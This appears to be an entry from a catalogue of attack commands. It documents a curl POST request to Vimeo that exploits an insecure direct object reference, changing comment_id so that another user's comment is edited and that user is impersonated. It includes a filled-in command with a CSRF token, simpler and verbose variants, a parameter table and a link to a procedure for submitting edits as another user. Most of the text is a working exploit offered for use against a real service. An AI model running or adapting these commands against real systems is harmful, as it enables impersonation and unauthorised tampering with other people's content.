---
data: >-
  curl -X POST "https://vimeo.com/121947416" -H "Content-Type:
  application/x-www-form-urlencoded; charset=UTF-8" -H "X-Requested-With:
  XMLHttpRequest" -H "Referer:
  https://vimeo.com/forums/wanted_and_offered/topic:130606" -H "Cookie:
  [auth_cookies]" --data-urlencode "text=..." --data-urlencode
  "action=edit_comment" --data-urlencode "comment_id=13010972" --data-urlencode
  "token=..." --data-urlencode "version=..."
tags:
  - post
  - edit
  - vimeo
type: command
output: Success response confirming edit
executor: curl
platforms:
  - Web
created_at: '2023-10-01T00:00:00Z'
updated_at: '2025-12-14T17:25:23.403Z'
id: ca72315a-6b44-4608-99dd-1d7d793ec04a
verified: false
validated: true
submitted: true
---
# vimeo-post-comment-edit

## Command

```bash
curl -X POST "https://vimeo.com/121947416" \
  -H "Content-Type: application/x-www-form-urlencoded; charset=UTF-8" \
  -H "X-Requested-With: XMLHttpRequest" \
  -H "Referer: https://vimeo.com/forums/wanted_and_offered/topic:130606" \
  -H "Cookie: [insert full authentication cookies including xsrft]" \
  --data-urlencode "text=Pimped%20%26%20posted%20%3B-)%20http%3A%2F%2Fthekitesurfchannel.com%2Fvideos%2Fi-am-gold-episode-2%2F" \
  --data-urlencode "action=edit_comment" \
  --data-urlencode "comment_id=13010972" \
  --data-urlencode "token=3a0822b94e27d8255ada31b02cc43ddc.2747550b08185735962e460fafcbae86" \
  --data-urlencode "version={\"name\":\"chrome\",\"version\":41,\"Platform\":{\"name\":\"mac\",\"mac\":true},\"Features\":{\"xpath\":true,\"air\":false,\"query\":true,\"json\":true,\"xhr\":true},\"Plugins\":{\"Flash\":{\"version\":17,\"build\":0}},\"chrome\":true,\"chrome41\":true,\"loaded\":true}"
```

## Description

This command submits an edited comment via POST, using a tampered comment_id to post changes as another user, completing the IDOR impersonation.

## Parameters

| Parameter | Description | Required |
|-----------|-------------|----------|
| text | URL-encoded new comment content | Yes |
| action | Set to edit_comment | Yes |
| comment_id | ID of the comment being edited (tampered) | Yes |
| token | CSRF protection token from form | Yes |
| version | JSON string of browser details | Yes |
| Cookie | Full session cookies | Yes |

## Examples

### Basic Usage

```bash
curl -X POST "https://vimeo.com/121947416" -H "Content-Type: application/x-www-form-urlencoded" --data-urlencode "text=New text" --data-urlencode "action=edit_comment" --data-urlencode "comment_id=13010972" --data-urlencode "token=[token]" -H "Cookie: [cookies]"
```

### Advanced Usage

Include full headers and verbose:

```bash
curl -v -X POST "https://vimeo.com/121947416" -H "X-Requested-With: XMLHttpRequest" --data-urlencode "text=..." ... -H "Cookie: [cookies]"
```

## Expected Output

JSON or HTML response indicating successful update, e.g., {"success": true}.

## Related

- [[commands/vimeo-get-modified-comment-edit-form]]
- [[procedures/Submit-Edited-Comment-as-Another-User]]
